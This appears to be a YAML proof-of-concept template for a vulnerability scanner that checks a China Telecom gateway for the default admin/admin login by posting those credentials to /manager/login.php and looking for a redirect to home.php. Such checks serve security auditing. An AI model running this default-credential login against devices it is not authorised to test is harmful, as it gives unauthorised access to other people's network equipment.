name: poc-yaml-ch1natelecom-g0teway-default-pwd
rules:
  - method: GET
    path: "/manager/index.php"
    expression: |
      response.status == 200 && response.body.bcontains(b"系统登录")
  - method: POST
    path: /manager/login.php
    follow_redirects: false
    body: |
      Name=admin&Pass=admin
    expression: |
      response.status == 302 && response.headers["location"] == "home.php"
detail:
  author: xueba(www.mjx-team.com/)
  
  links:
    - https://www.mjx-team.com/
